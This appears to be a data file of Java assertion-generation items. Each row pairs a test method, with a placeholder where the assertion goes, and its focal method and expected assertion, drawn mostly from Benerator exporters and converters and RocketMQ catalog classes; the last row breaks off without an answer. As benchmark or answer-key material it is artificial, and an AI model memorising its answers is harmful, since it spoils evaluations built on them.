"test() { ComplexTypeDescriptor descriptor = createComplexType(""Person""); Entity entity = new Entity(descriptor, ""name"", ""Alice"", ""age"", 23); Object[] array = new Object[] {""Alice"", 23}; String[] featureNames = {""name"", ""age""}; ""<AssertPlaceHolder>""; }
convert(Entity entity) { if (entity == null) { return null; } if (featureNames == null) { initFeatureNamesFromTemplate(entity); } Object[] result = new Object[featureNames.length]; for (int i = 0; i < featureNames.length; i++) { result[i] = entity.getComponent(featureNames[i]); } return result; }"	assertArrayEquals(array, new Entity2ArrayConverter(featureNames).convert(entity))
"Exception { CSVEntityExporter exporter = new CSVEntityExporter(CUSTOM_FILE.getAbsolutePath(), ""name""); exporter.setEndWithNewLine(true); consumeAliceBobCharlyAndClose(exporter); ""<AssertPlaceHolder>""; }
setEndWithNewLine(boolean endWithNewLine) { this.endWithNewLine = endWithNewLine; }"	"assertEquals(""name\r\nAlice\r\nBob\r\nCharly\r\n"", getContent(CUSTOM_FILE))"
"Exception { CSVEntityExporter exporter = new CSVEntityExporter(CUSTOM_FILE.getAbsolutePath(), ""name""); exporter.setHeadless(true); consumeAliceBobCharlyAndClose(exporter); ""<AssertPlaceHolder>""; }
setHeadless(boolean headless) { this.headless = headless; }"	"assertEquals(""Alice\r\nBob\r\nCharly"", getContent(CUSTOM_FILE))"
"Exception { CSVEntityExporter exporter = new CSVEntityExporter(); exporter.setQuoteEmpty(true); consumeAliceBobCharlyAndClose(exporter); ""<AssertPlaceHolder>""; }
setQuoteEmpty(boolean quoteEmpty) { this.quoteEmpty = quoteEmpty; }"	"assertEquals(""name,age,notes\r\nAlice,23,""""""None""""""\r\nBob,34,\r\nCharly,45,"""""", getContent(DEFAULT_FILE))"
"Exception { CSVEntityExporter exporter = new CSVEntityExporter(); exporter.setQuoteEmpty(false); consumeAliceBobCharlyAndClose(exporter); ""<AssertPlaceHolder>""; }
setQuoteEmpty(boolean quoteEmpty) { this.quoteEmpty = quoteEmpty; }"	"assertEquals(""name,age,notes\r\nAlice,23,""""""None""""""\r\nBob,34,\r\nCharly,45,"", getContent(DEFAULT_FILE))"
"testGetParts2() { DBTable dbTable = new DBTable(""TestTable""); DBTable owner = new DBTable(""TestOwner""); DBColumn column = new DBColumn(""TestColumn"", dbTable, DBDataType.getInstance(""int"")); dbTable.addColumn(column); dbTable.addForeignKey( new DBForeignKeyConstraint(""TestFK"", true, owner, column.getName(), new DBTable(""Name""), ""Referee Column Name"")); LazyTableComplexTypeDescriptor lazyTableComplexTypeDescriptor = new LazyTableComplexTypeDescriptor(dbTable, new DefaultDBSystem(""42"", null, null, new DefaultBeneratorContext())); lazyTableComplexTypeDescriptor.getParts(); ""<AssertPlaceHolder>""; }
getParts() { assureLoaded(); return super.getParts(); }"	assertTrue(lazyTableComplexTypeDescriptor.loaded)
"testGetComponent2() { DBTable dbTable = new DBTable(""TestTable""); DBTable owner = new DBTable(""TestOwner""); DBColumn column = new DBColumn(""TestColumn"", dbTable, DBDataType.getInstance(""int"")); dbTable.addColumn(column); dbTable.addForeignKey( new DBForeignKeyConstraint(""TestFK"", true, owner, column.getName(), new DBTable(""Name""), ""Referee Column Name"")); LazyTableComplexTypeDescriptor lazyTableComplexTypeDescriptor = new LazyTableComplexTypeDescriptor(dbTable, new DefaultDBSystem(""42"", null, null, new DefaultBeneratorContext())); lazyTableComplexTypeDescriptor.getComponent(""TestTable""); ""<AssertPlaceHolder>""; }
getComponent(String name) { assureLoaded(); return super.getComponent(name); }"	assertTrue(lazyTableComplexTypeDescriptor.loaded)
"testGetComponents2() { DBTable dbTable = new DBTable(""TestTable""); DBTable owner = new DBTable(""TestOwner""); DBColumn column = new DBColumn(""TestColumn"", dbTable, DBDataType.getInstance(""int"")); dbTable.addColumn(column); dbTable.addForeignKey( new DBForeignKeyConstraint(""TestFK"", true, owner, column.getName(), new DBTable(""Name""), ""Referee Column Name"")); LazyTableComplexTypeDescriptor lazyTableComplexTypeDescriptor = new LazyTableComplexTypeDescriptor(dbTable, new DefaultDBSystem(""42"", null, null, new DefaultBeneratorContext())); lazyTableComplexTypeDescriptor.getComponents(); ""<AssertPlaceHolder>""; }
getComponents() { assureLoaded(); return super.getComponents(); }"	assertTrue(lazyTableComplexTypeDescriptor.loaded)
"testGetDeclaredParts2() { DBTable dbTable = new DBTable(""TestTable""); DBTable owner = new DBTable(""TestOwner""); DBColumn column = new DBColumn(""TestColumn"", dbTable, DBDataType.getInstance(""int"")); dbTable.addColumn(column); dbTable.addForeignKey( new DBForeignKeyConstraint(""TestFK"", true, owner, column.getName(), new DBTable(""Name""), ""Referee Column Name"")); LazyTableComplexTypeDescriptor lazyTableComplexTypeDescriptor = new LazyTableComplexTypeDescriptor(dbTable, new DefaultDBSystem(""42"", null, null, new DefaultBeneratorContext())); lazyTableComplexTypeDescriptor.getDeclaredParts(); ""<AssertPlaceHolder>""; }
getDeclaredParts() { assureLoaded(); return super.getDeclaredParts(); }"	assertTrue(lazyTableComplexTypeDescriptor.loaded)
"testIsDeclaredComponent2() { DBTable dbTable = new DBTable(""TestTable""); DBTable owner = new DBTable(""TestOwner""); DBColumn column = new DBColumn(""TestColumn"", dbTable, DBDataType.getInstance(""int"")); dbTable.addColumn(column); dbTable.addForeignKey( new DBForeignKeyConstraint(""TestFK"", true, owner, column.getName(), new DBTable(""Name""), ""Referee Column Name"")); LazyTableComplexTypeDescriptor lazyTableComplexTypeDescriptor = new LazyTableComplexTypeDescriptor(dbTable, new DefaultDBSystem(""42"", null, null, new DefaultBeneratorContext())); lazyTableComplexTypeDescriptor.isDeclaredComponent(""Component Name""); ""<AssertPlaceHolder>""; }
isDeclaredComponent(String componentName) { assureLoaded(); return super.isDeclaredComponent(componentName); }"	assertTrue(lazyTableComplexTypeDescriptor.loaded)
"testGetIdComponentNames2() { DBTable dbTable = new DBTable(""TestTable""); DBTable owner = new DBTable(""TestOwner""); DBColumn column = new DBColumn(""TestColumn"", dbTable, DBDataType.getInstance(""int"")); dbTable.addColumn(column); dbTable.addForeignKey( new DBForeignKeyConstraint(""TestFK"", true, owner, column.getName(), new DBTable(""Name""), ""Referee Column Name"")); LazyTableComplexTypeDescriptor lazyTableComplexTypeDescriptor = new LazyTableComplexTypeDescriptor(dbTable, new DefaultDBSystem(""42"", null, null, new DefaultBeneratorContext())); lazyTableComplexTypeDescriptor.getIdComponentNames(); ""<AssertPlaceHolder>""; }
getIdComponentNames() { assureLoaded(); return super.getIdComponentNames(); }"	assertTrue(lazyTableComplexTypeDescriptor.loaded)
"testGetReferenceComponents2() { DBTable dbTable = new DBTable(""TestTable""); DBTable owner = new DBTable(""TestOwner""); DBColumn column = new DBColumn(""TestColumn"", dbTable, DBDataType.getInstance(""int"")); dbTable.addColumn(column); dbTable.addForeignKey( new DBForeignKeyConstraint(""TestFK"", true, owner, column.getName(), new DBTable(""Name""), ""Referee Column Name"")); LazyTableComplexTypeDescriptor lazyTableComplexTypeDescriptor = new LazyTableComplexTypeDescriptor(dbTable, new DefaultDBSystem(""42"", null, null, new DefaultBeneratorContext())); lazyTableComplexTypeDescriptor.getReferenceComponents(); ""<AssertPlaceHolder>""; }
getReferenceComponents() { assureLoaded(); return super.getReferenceComponents(); }"	assertTrue(lazyTableComplexTypeDescriptor.loaded)
"testConstructor() { ""<AssertPlaceHolder>""; }
toString() { return getClass().getSimpleName() + '[' + hiGenerator + ',' + maxLo + ']'; }"	"assertEquals(""QueryHiLoGenerator[AsNonNullGenerator[QueryLongGenerator[Selector]],100]"", (new QueryHiLoGenerator(""Selector"", new EvaluateStatementTest.StSys())).toString())"
"InvocationTargetException { PGcustomtype pGcustomtype = new PGcustomtype(""NotArray""); Class<?> myClass = pGcustomtype.generateClass(""INT"", false); var obj = myClass.getConstructor(Object.class).newInstance(""some values""); ""<AssertPlaceHolder>""; }
generateClass(String type, boolean isTypeArray) {  // use newClassName class if already exist Class<?> existClass = null; try { existClass = Class.forName(newClassName); } catch (ClassNotFoundException e) { existClass = null; }  if (existClass == null) { try { // check newClassName class exist again with classPool CtClass oldClass = classPool.getOrNull(newClassName); if (oldClass !=null) { byte[] b = oldClass.toBytecode(); return defineClass(newClassName, b, 0, b.length); }  CtClass newClass; if (isTypeArray) { newClass = generateClassFromPGArrayObject(type); } else { newClass = generateClassFromPGobject(type); } // Write the generated temporary class to disk, use for correction purpose //                newClass.writeFile(""com/rapiddweller/platform/db/postgres/template""); return newClass.toClass(this.getClass().getClassLoader(), getClass().getProtectionDomain()); } catch (CannotCompileException | NotFoundException | IOException e) { throw new RuntimeException(e); } } else { return existClass; } }"	assertTrue(obj instanceof PGobject)
"InvocationTargetException { PGcustomtype pGcustomtype = new PGcustomtype(""IsArray""); Class<?> myClass = pGcustomtype.generateClass(""_INT"", true); Integer[] arr = new Integer[]{1,2,3,4,5}; var obj = myClass.getConstructor(Object[].class).newInstance((Object) arr); ""<AssertPlaceHolder>""; }
generateClass(String type, boolean isTypeArray) {  // use newClassName class if already exist Class<?> existClass = null; try { existClass = Class.forName(newClassName); } catch (ClassNotFoundException e) { existClass = null; }  if (existClass == null) { try { // check newClassName class exist again with classPool CtClass oldClass = classPool.getOrNull(newClassName); if (oldClass !=null) { byte[] b = oldClass.toBytecode(); return defineClass(newClassName, b, 0, b.length); }  CtClass newClass; if (isTypeArray) { newClass = generateClassFromPGArrayObject(type); } else { newClass = generateClassFromPGobject(type); } // Write the generated temporary class to disk, use for correction purpose //                newClass.writeFile(""com/rapiddweller/platform/db/postgres/template""); return newClass.toClass(this.getClass().getClassLoader(), getClass().getProtectionDomain()); } catch (CannotCompileException | NotFoundException | IOException e) { throw new RuntimeException(e); } } else { return existClass; } }"	assertTrue(obj instanceof PGArrayObject)
"IOException { DbUnitEntityExporter exporter = new DbUnitEntityExporter(FILENAME); exporter.startProductConsumption(ALICE); exporter.finishProductConsumption(ALICE); exporter.close(); exporter.close(); ""<AssertPlaceHolder>""; FileUtil.deleteIfExists(FILE); }
close() { initializeIfCreated(); if (state == State.CLOSED) { return; } if (handler != null) { try { handler.endElement("""", """", ""dataset""); handler.endDocument(); handler = null; } catch (SAXException e) { throw BeneratorExceptionFactory.getInstance().configurationError(""Error closing XML file."", e); } finally { IOUtil.close(out); out = null; } } }"	"assertEquals(""<?xml version=""1.0"" encoding=""UTF-8""?>\n"" + ""<dataset>\n"" + ""<Person name=""Alice"" age=""23""/>\n"" + ""</dataset>\n"", IOUtil.getContentOfURI(FILENAME))"
"IOException { DbUnitEntityExporter exporter = new DbUnitEntityExporter(FILENAME); exporter.close(); ""<AssertPlaceHolder>""; FileUtil.deleteIfExists(FILE); }
close() { initializeIfCreated(); if (state == State.CLOSED) { return; } if (handler != null) { try { handler.endElement("""", """", ""dataset""); handler.endDocument(); handler = null; } catch (SAXException e) { throw BeneratorExceptionFactory.getInstance().configurationError(""Error closing XML file."", e); } finally { IOUtil.close(out); out = null; } } }"	"assertEquals(""<?xml version=""1.0"" encoding=""UTF-8""?>\n"" + ""<dataset/>\n"", IOUtil.getContentOfURI(FILENAME))"
"testMissingColumnSpec() { FixedWidthEntitySource source = new FixedWidthEntitySource(URI, descriptor, SystemInfo.getFileEncoding(), null); source.setContext(new DefaultBeneratorContext()); DataIterator<Entity> iterator = source.iterator(); ""<AssertPlaceHolder>""; }
iterator() { if (!initialized) { init(); } return new ConvertingDataIterator<>(this.source.iterator(), converter); }"	assertEquals(BOB, nextOf(iterator))
"testExec() { NowMethod nowMethod = new NowMethod(); ""<AssertPlaceHolder>""; }
exec(List args) { return new SimpleDate(new Date(System.currentTimeMillis())); }"	assertEquals(2, ((SimpleDate) nowMethod.exec(new ArrayList<>())).getDateType())
"testAbstractType_primitive() { ""<AssertPlaceHolder>""; }
abstractType(Class<?> concreteType) { String result = mapper.abstractType(concreteType); if (result == null) { result = concreteType.getName(); } return result; }"	"assertEquals(""string"", provider.abstractType(String.class))"
"testAbstractType_bean() { ""<AssertPlaceHolder>""; }
abstractType(Class<?> concreteType) { String result = mapper.abstractType(concreteType); if (result == null) { result = concreteType.getName(); } return result; }"	assertEquals(ChildBean.class.getName(), provider.abstractType(ChildBean.class))
"testAbstractType_enum() { ""<AssertPlaceHolder>""; }
abstractType(Class<?> concreteType) { String result = mapper.abstractType(concreteType); if (result == null) { result = concreteType.getName(); } return result; }"	"assertEquals(""com.rapiddweller.domain.person.Gender"", provider.abstractType(Gender.class))"
"testConcreteType_bean() { ""<AssertPlaceHolder>""; }
concreteType(String primitiveType) {  try { Class<?> result = mapper.concreteType(primitiveType); PrimitiveType classType = PrimitiveType.getInstance(primitiveType);  if (result == null) { if (classType != null) { result = Class.forName(classType.getJavaType().getName()); } else { result = Class.forName(primitiveType); } } return result;  } catch (ClassNotFoundException e) { throw BeneratorExceptionFactory.getInstance().configurationError(""No class mapping found for '"" + primitiveType + ""'"", e); } }"	assertEquals(ChildBean.class, provider.concreteType(ChildBean.class.getName()))
"testGetTypeDescriptor_primitive() { TypeDescriptor type = provider.getTypeDescriptor(""int""); ""<AssertPlaceHolder>""; }
getTypeDescriptor(String abstractTypeName) { if (mapper.concreteType(abstractTypeName) != null) { return null; // ignore simple types, since they are provided by the PrimitiveDescriptorProvider } TypeDescriptor result = super.getTypeDescriptor(abstractTypeName); if (result == null && BeanUtil.existsClass(abstractTypeName)) { result = createTypeDescriptor(BeanUtil.forName(abstractTypeName)); } return result; }"	assertNull(type)
"testEntity() { ComplexTypeDescriptor descriptor = getPersonTypeDescriptor(); Entity entity = createAlice(descriptor); PersonBean bean = new PersonBean(""Alice"", 23); ""<AssertPlaceHolder>""; }
convert(Object entityOrArray) { return convertAny(entityOrArray); }"	assertEquals(bean, new Entity2JavaConverter().convert(entity))
"testEntityWithChildClass() { Entity entity = createAlice(getChildTypeDescriptor()); entity.set(""childNo"", 1); ChildBean bean = new ChildBean(""Alice"", 23, 1); ""<AssertPlaceHolder>""; }
convert(Object entityOrArray) { return convertAny(entityOrArray); }"	assertEquals(bean, new Entity2JavaConverter().convert(entity))
"testEntityArray() { ComplexTypeDescriptor descriptor = getPersonTypeDescriptor(); Object[] expected = new Object[] {new PersonBean(""Alice"", 23), new PersonBean(""Bob"", 34)}; Object[] array = new Object[] {createAlice(descriptor), createBob(descriptor)}; Object[] actual = (Object[]) new Entity2JavaConverter().convert(array); ""<AssertPlaceHolder>""; }
convert(Object entityOrArray) { return convertAny(entityOrArray); }"	"assertTrue(""Expected ["" + ArrayFormat.format(expected) + ""], found: ["" + ArrayFormat.format(actual) + ""]"", Arrays.deepEquals(expected, actual))"
"testInstanceMethodObject() { POJO target = new POJO(); JavaInvoker invoker = new JavaInvoker(target, ""dynP1""); try { invoker.startProductConsumption(""Alice""); invoker.startProductConsumption(""Bob""); ""<AssertPlaceHolder>""; } finally { IOUtil.close(invoker); } }
startProductConsumption(Object object) { if (object instanceof Entity) { invokeByEntity((Entity) object); } else if (object.getClass().isArray()) { invokeByArray((Object[]) object); } else { invokeByObject(object); } }"	assertEquals(2, target.dynCountP1)
"testStaticMethodObject() { POJO.statCountP1 = 0; Class<POJO> target = POJO.class; JavaInvoker invoker = new JavaInvoker(target, ""statP1""); try { invoker.startProductConsumption(23); invoker.startProductConsumption(34); ""<AssertPlaceHolder>""; } finally { IOUtil.close(invoker); } }
startProductConsumption(Object object) { if (object instanceof Entity) { invokeByEntity((Entity) object); } else if (object.getClass().isArray()) { invokeByArray((Object[]) object); } else { invokeByObject(object); } }"	assertEquals(2, POJO.statCountP1)
"test() { ComplexTypeDescriptor descriptor = createComplexType(""Person""); Entity entity = new Entity(descriptor, ""name"", ""Alice"", ""age"", 23); Map<?, ?> map = CollectionUtil.buildMap(""name"", ""Alice"", ""age"", 23); ""<AssertPlaceHolder>""; }
convert(Entity sourceValue) { return convertEntity(sourceValue); }"	assertEquals(map, new Entity2MapConverter().convert(entity))
"test() { ComplexTypeDescriptor descriptor = createComplexType(""Person""); Entity entity = new Entity(descriptor, ""name"", ""Alice"", ""age"", 23); Map<?, ?> map = CollectionUtil.buildOrderedMap(""name"", ""Alice"", ""age"", 23); ""<AssertPlaceHolder>""; }
convert(Map map) { Entity entity = new Entity(descriptor); for (Map.Entry entry : ((Set<Map.Entry>) map.entrySet())) { entity.setComponent((String) entry.getKey(), entry.getValue()); } return entity; }"	assertEquals(entity, new Map2EntityConverter(descriptor).convert(map))
"ConversionException { ArrayList<String> stringList = new ArrayList<>(); stringList.add(""foo""); DocumentIdToEntityConverter documentIdToEntityConverter = new DocumentIdToEntityConverter(stringList); ""<AssertPlaceHolder>""; }
convert(Document document) throws ConversionException { return getId(document, new ArrayList<>(idFieldPath)); }"	assertNull(documentIdToEntityConverter.convert(new Document()))
"testConstructor() { ""<AssertPlaceHolder>""; }
toString() { return this.getClass().getSimpleName(); }"	"assertEquals(""DocumentToObjectConverter"", (new DocumentToObjectConverter(true)).toString())"
"ConversionException { DocumentToObjectConverter documentToObjectConverter = new DocumentToObjectConverter(false); ""<AssertPlaceHolder>""; }
convert(Document document) throws ConversionException { Object[] converted = convertToArray(document); if (this.simplifying && converted.length == 1) { return converted[0]; } return converted; }"	assertEquals(0, ((Object[]) documentToObjectConverter.convert(new Document())).length)
"ConversionException { DocumentToObjectConverter documentToObjectConverter = new DocumentToObjectConverter(true);  Document document = new Document(); document.append(""Key"", ""Value""); ""<AssertPlaceHolder>""; }
convert(Document document) throws ConversionException { Object[] converted = convertToArray(document); if (this.simplifying && converted.length == 1) { return converted[0]; } return converted; }"	"assertEquals(""Value"", documentToObjectConverter.convert(document))"
"ConversionException { DocumentToObjectConverter documentToObjectConverter = new DocumentToObjectConverter(true);  Document document = new Document(); document.append(""Key"", new Document()); ""<AssertPlaceHolder>""; }
convert(Document document) throws ConversionException { Object[] converted = convertToArray(document); if (this.simplifying && converted.length == 1) { return converted[0]; } return converted; }"	assertEquals(0, ((Object[]) documentToObjectConverter.convert(document)).length)
"ConversionException { DocumentToObjectConverter documentToObjectConverter = new DocumentToObjectConverter(true);  Document document = new Document(); document.append(""Key"", new ArrayList<>()); ""<AssertPlaceHolder>""; }
convert(Document document) throws ConversionException { Object[] converted = convertToArray(document); if (this.simplifying && converted.length == 1) { return converted[0]; } return converted; }"	assertEquals(0, ((Object[]) documentToObjectConverter.convert(document)).length)
"ConversionException { DocumentToObjectConverter documentToObjectConverter = new DocumentToObjectConverter(true);  Document document = new Document(); document.append(""Key"", Decimal128.parse(""42"")); ""<AssertPlaceHolder>""; }
convert(Document document) throws ConversionException { Object[] converted = convertToArray(document); if (this.simplifying && converted.length == 1) { return converted[0]; } return converted; }"	assertEquals(42.0, documentToObjectConverter.convert(document))
"ConversionException {  DocumentToObjectConverter documentToObjectConverter = new DocumentToObjectConverter(true);  Document document = new Document(); document.append(""Key"", null); ""<AssertPlaceHolder>""; }
convert(Document document) throws ConversionException { Object[] converted = convertToArray(document); if (this.simplifying && converted.length == 1) { return converted[0]; } return converted; }"	assertNull(documentToObjectConverter.convert(document))
"ConversionException { DocumentToObjectConverter documentToObjectConverter = new DocumentToObjectConverter(true);  Document document = new Document(); document.append(""codec"", ""Value""); document.append(""Key"", ""Value""); ""<AssertPlaceHolder>""; }
convert(Document document) throws ConversionException { Object[] converted = convertToArray(document); if (this.simplifying && converted.length == 1) { return converted[0]; } return converted; }"	assertEquals(2, ((Object[]) documentToObjectConverter.convert(document)).length)
"ConversionException { DocumentToObjectConverter documentToObjectConverter = new DocumentToObjectConverter(true);  ArrayList<Object> objectList = new ArrayList<>(); objectList.add(""42"");  Document document = new Document(); document.append(""Key"", objectList); ""<AssertPlaceHolder>""; }
convert(Document document) throws ConversionException { Object[] converted = convertToArray(document); if (this.simplifying && converted.length == 1) { return converted[0]; } return converted; }"	assertEquals(1, ((Object[]) documentToObjectConverter.convert(document)).length)
"ConversionException { DocumentToObjectConverter documentToObjectConverter = new DocumentToObjectConverter(true);  ArrayList<Object> objectList = new ArrayList<>(); objectList.add(new Document());  Document document = new Document(); document.append(""Key"", objectList); ""<AssertPlaceHolder>""; }
convert(Document document) throws ConversionException { Object[] converted = convertToArray(document); if (this.simplifying && converted.length == 1) { return converted[0]; } return converted; }"	assertEquals(1, ((Object[]) documentToObjectConverter.convert(document)).length)
"ConversionException { DocumentToObjectConverter documentToObjectConverter = new DocumentToObjectConverter(true);  ArrayList<Object> objectList = new ArrayList<>(); objectList.add(new ArrayList<>());  Document document = new Document(); document.append(""Key"", objectList); ""<AssertPlaceHolder>""; }
convert(Document document) throws ConversionException { Object[] converted = convertToArray(document); if (this.simplifying && converted.length == 1) { return converted[0]; } return converted; }"	assertEquals(1, ((Object[]) documentToObjectConverter.convert(document)).length)
"testSetHeaderScript() { ScriptedEntityExporter scriptedEntityExporter = new ScriptedEntityExporter(); scriptedEntityExporter.setHeaderScript(""Header Script""); ""<AssertPlaceHolder>""; }
getHeaderScript() { return headerScript; }"	"assertEquals(""Header Script"", scriptedEntityExporter.getHeaderScript())"
"testSetPartScript() { ScriptedEntityExporter scriptedEntityExporter = new ScriptedEntityExporter(); scriptedEntityExporter.setPartScript(""Part Script""); ""<AssertPlaceHolder>""; }
getPartScript() { return partScript; }"	"assertEquals(""Part Script"", scriptedEntityExporter.getPartScript())"
"testSetFooterScript() { ScriptedEntityExporter scriptedEntityExporter = new ScriptedEntityExporter(); scriptedEntityExporter.setFooterScript(""Footer Script""); ""<AssertPlaceHolder>""; }
getFooterScript() { return footerScript; }"	"assertEquals(""Footer Script"", scriptedEntityExporter.getFooterScript())"
"testEmptyStandard() { try { XLSEntityExporter exporter = new XLSEntityExporter(); exporter.close(); ""<AssertPlaceHolder>""; } finally { if (CLEAN_UP) { FileUtil.deleteIfExists(STANDARD_FILE); } } }
close() { if (workbook == null) { workbook = new HSSFWorkbook(); // if no data was added, create an empty Excel document } else { XLSUtil.autoSizeColumns(workbook); }  File directory = new File(uri); // check if path exists, if not make sure it exists if (directory.getParent() != null && !directory.isDirectory() && !directory.getParentFile().exists()) { boolean result = directory.getParentFile().mkdirs(); if (!result) { throw BeneratorExceptionFactory.getInstance().configurationError(""filepath does not exists and can not be created ...""); } }  // Write the output to a file try (FileOutputStream out = new FileOutputStream(uri)) { workbook.write(out); } catch (IOException e) { throw BeneratorExceptionFactory.getInstance().configurationError(""Error writing XLS file"", e); } }"	assertTrue(STANDARD_FILE.exists())
"testQueryAttributes() { BeneratorContext context = new DefaultBeneratorContext(); DOMTree tree = new DOMTree(""com/rapiddweller/platform/xml/teamplayers.xml"", context); tree.setOutputUri(""target/test-classes/teamplayers3.xml""); DataSource<?> source = tree.query(""//city"", true, context); DataIterator iterator = source.iterator(); expectNextElements(iterator, ""Atlanta"", ""Boston"", ""Cleveland"", ""Oslo""); ""<AssertPlaceHolder>""; IOUtil.close(tree); }
query(String selector, boolean simplify, Context context) { beInitialized(); logger.debug(""query({}, {}, context)"", selector, simplify); try { NodeList nodes = XPathUtil.queryNodes(document, selector); logger.debug(""query() found {} results"", nodes.getLength()); List<Object> list = new ArrayList<>(nodes.getLength()); for (int i = 0; i < nodes.getLength(); i++) { Node node = nodes.item(i); list.add(node.getTextContent()); } return new DataSourceFromIterable<>(list, Object.class); } catch (XPathExpressionException e) { throw BeneratorExceptionFactory.getInstance().syntaxErrorForText( ""Error querying items with xpath"", e, selector, -1, -1); } }"	assertNull(iterator.next(new DataContainer<Entity>()))
"testGetUri() { ""<AssertPlaceHolder>""; }
getUri() { return uri; }"	"assertEquals(""export.xml"", (new XMLEntityExporter()).getUri())"
"testSetUri() { XMLEntityExporter xmlEntityExporter = new XMLEntityExporter(); xmlEntityExporter.setUri(""Uri""); ""<AssertPlaceHolder>""; }
getUri() { return uri; }"	"assertEquals(""Uri"", xmlEntityExporter.getUri())"
"testToString() { ""<AssertPlaceHolder>""; }
toString() { return getClass().getSimpleName() + '[' + uri + ']'; }"	"assertEquals(""XMLEntityExporter[export.xml]"", (new XMLEntityExporter()).toString())"
"testGetModulePath() { // 创建模拟的多级模块结构 ModuleNode root = new ModuleNode(""root"", new File(""/path/to/root"")); ModuleNode moduleLevel1 = new ModuleNode(""moduleLevel1"", new File(""/path/to/root/moduleLevel1"")); ModuleNode moduleLevel2 = new ModuleNode(""moduleLevel2"", new File(""/path/to/root/moduleLevel1/moduleLevel2"")); root.addSubModule(moduleLevel1); moduleLevel1.addSubModule(moduleLevel2);  // 创建一个示例的 RelatedTestCase RelatedTestCase testCase = new RelatedTestCase(); testCase.setRelativeFilePath(""moduleLevel2"" + File.separator + ""SomeTest.java"");  // 测试 getModulePath 方法 String modulePath = CtUtils.getModulePath(null, root, testCase); ""<AssertPlaceHolder>""; }
getModulePath(Compiler compiler, ModuleNode rootModule, RelatedTestCase testCase) { List<String> path = new ArrayList<>(); Path testFilePath = Paths.get(testCase.getRelativeFilePath()); String targetModuleName = testFilePath.getName(0).toString().toLowerCase(); String sep = File.separator; if (compiler == Compiler.GRADLE || compiler == Compiler.GRADLEW) { sep = "":""; } if (findModulePath(rootModule, targetModuleName, path)) { // 移除根模块并返回路径 path.remove(0); return String.join(sep, path); } return """"; }"	"assertEquals(""moduleLevel1"" + File.separator + ""moduleLevel2"", modulePath)"
"addArgumentResolvers() { List<HandlerMethodArgumentResolver> argumentResolvers = Lists.newArrayList(); authWebMVCConfigurerAdapter.addArgumentResolvers(argumentResolvers); Assertions.""<AssertPlaceHolder>""; }
addArgumentResolvers(List<HandlerMethodArgumentResolver> argumentResolvers) { argumentResolvers.add(new HandlerMethodArgumentResolver() {  @Override public boolean supportsParameter(MethodParameter methodParameter) { return methodParameter.getParameterType().isAssignableFrom(UserInfo.class); }  @Override public Object resolveArgument(MethodParameter methodParameter, ModelAndViewContainer modelAndViewContainer, NativeWebRequest nativeWebRequest, WebDataBinderFactory webDataBinderFactory) throws Exception { UserInfo userInfo = (UserInfo) WebUtil.getValueFromSession((HttpServletRequest) nativeWebRequest.getNativeRequest(), UserInfo.USER_INFO); if (userInfo != null) { return userInfo; } throw new MissingServletRequestPartException(UserInfo.USER_INFO); } });  super.addArgumentResolvers(argumentResolvers);  //REVIEW ME }"	assertEquals(1, argumentResolvers.size())
"testCreateCatalog() { RocketMQCatalogFactory factory = new RocketMQCatalogFactory(); FactoryUtil.DefaultCatalogContext context = new FactoryUtil.DefaultCatalogContext( ""rocketmq-catalog"", new HashMap<>(), null, this.getClass().getClassLoader()); Catalog catalog = factory.createCatalog(context); ""<AssertPlaceHolder>""; }
createCatalog(Context context) { final FactoryUtil.CatalogFactoryHelper helper = FactoryUtil.createCatalogFactoryHelper(this, context); helper.validate(); return new RocketMQCatalog( context.getName(), helper.getOptions().get(DEFAULT_DATABASE), helper.getOptions().get(NAME_SERVER_ADDR), helper.getOptions().get(SCHEMA_REGISTRY_BASE_URL)); }"	assertNotNull(catalog)
"testFactoryIdentifier() { RocketMQCatalogFactory factory = new RocketMQCatalogFactory(); ""<AssertPlaceHolder>""; }
factoryIdentifier() { return IDENTIFIER; }"	"assertEquals(factory.factoryIdentifier(), ""rocketmq_catalog"")"
"testRequiredOptions() { RocketMQCatalogFactory factory = new RocketMQCatalogFactory(); Set<ConfigOption<?>> options = factory.requiredOptions(); ""<AssertPlaceHolder>""; }
requiredOptions() { return Collections.emptySet(); }"	assertNotNull(options)
"testOptionalOptions() { RocketMQCatalogFactory factory = new RocketMQCatalogFactory(); Set<ConfigOption<?>> options = factory.optionalOptions(); ""<AssertPlaceHolder>""; }
optionalOptions() { Set<ConfigOption<?>> options = new HashSet<>(); options.add(DEFAULT_DATABASE); options.add(NAME_SERVER_ADDR); options.add(SCHEMA_REGISTRY_BASE_URL); return options; }"	assertEquals(options.size(), 3)
"testGetFactory() { Optional<Factory> factory = rocketMQCatalog.getFactory(); ""<AssertPlaceHolder>""; }
getFactory() { return Optional.of(new RocketMQCatalogFactory()); }"	assertNotNull(factory.get())
"IllegalAccessException { rocketMQCatalog.close();  Class<? extends RocketMQCatalog> aClass = rocketMQCatalog.getClass(); Field mqAdminExtField = aClass.getDeclaredField(""mqAdminExt""); mqAdminExtField.setAccessible(true); Field schemaRegistryClientField = aClass.getDeclaredField(""schemaRegistryClient""); schemaRegistryClientField.setAccessible(true);  Object mqAdminExt = mqAdminExtField.get(rocketMQCatalog); Object schemaRegistryClient = schemaRegistryClientField.get(rocketMQCatalog); ""<AssertPlaceHolder>""; }
close() throws CatalogException { if (Objects.nonNull(mqAdminExt)) { mqAdminExt.shutdown(); mqAdminExt = null; } if (Objects.nonNull(schemaRegistryClient)) { schemaRegistryClient = null; } }"	assertNull(schemaRegistryClient)
"DatabaseNotExistException { CatalogDatabase database = rocketMQCatalog.getDatabase(""default""); ""<AssertPlaceHolder>""; }
getDatabase(String databaseName) throws DatabaseNotExistException, CatalogException { if (StringUtils.isEmpty(databaseName)) { throw new CatalogException(""Database name can not be null or empty.""); } if (!databaseExists(databaseName)) { throw new DatabaseNotExistException(getName(), databaseName); } else { return new CatalogDatabaseImpl(new HashMap<>(), null); } }"	assertNotNull(database)
"testDatabaseExists() { boolean exists = rocketMQCatalog.databaseExists(""default""); ""<AssertPlaceHolder>""; }
databaseExists(String databaseName) throws CatalogException { return getDefaultDatabase().equals(databaseName); }"	assertTrue(exists)
"TableNotExistException { ObjectPath objectPath = new ObjectPath(""default"", ""test""); CatalogBaseTable catalogBaseTable = rocketMQCatalog.getTable(objectPath); ""<AssertPlaceHolder>""; }
